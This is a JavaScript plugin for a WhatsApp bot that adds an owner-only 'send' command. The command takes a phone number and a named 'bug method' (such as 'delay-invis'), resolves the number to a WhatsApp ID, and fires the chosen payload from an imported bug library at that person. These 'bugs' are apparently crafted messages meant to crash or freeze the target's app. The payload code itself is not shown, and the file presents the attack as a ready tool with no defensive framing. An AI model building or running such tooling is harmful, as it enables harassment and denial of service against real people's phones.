/**
 * @file Bug send command
 * @module plugins/owner/send
 */

import { bugMethods } from "#lib/bug.js";

let handler = async (m, { sock, args, usedPrefix, command }) => {
    if (!args[0] || !args[1]) {
        return m.reply(`*Wrong Format!*\n\n*Usage:* ${usedPrefix + command} <number> <method>\n*Example:* ${usedPrefix + command} 628xxx delay-invis`);
    }

    let target = args[0].replace(/[^0-9]/g, "");
    const method = args[1]?.toLowerCase();

    if (!target.endsWith("@s.whatsapp.net")) {
        target += "@s.whatsapp.net";
    }

    if (!bugMethods[method]) {
        return m.reply(`❌ Method *${method}* not found.\nType *.methods* to see the list.`);
    }

    // Resolve phone number JID to LID for proper delivery
    let resolved = target;
    try {
        const check = await sock.onWhatsApp(target.replace("@s.whatsapp.net", ""));
        if (check && check[0]?.jid) {
            resolved = check[0].jid;
        }
    } catch {
        // Fallback to original target if resolution fails
    }

    await m.reply(`🚀 Sending bug *${method}* to target *${resolved}*...`);

    try {
        await bugMethods[method](sock, resolved, true);
        await m.reply(`✅ Successfully relayed bug *${method}* to the target.`);
    } catch (e) {
        global.logger?.error({ error: e.message, stack: e.stack }, "Bug send error");
        await m.reply(`❌ Failed to send bug: ${e.message}`);
    }
};

handler.help = ["send"];
handler.tags = ["owner"];
handler.command = /^(send)$/i;
handler.owner = true;

export default handler;
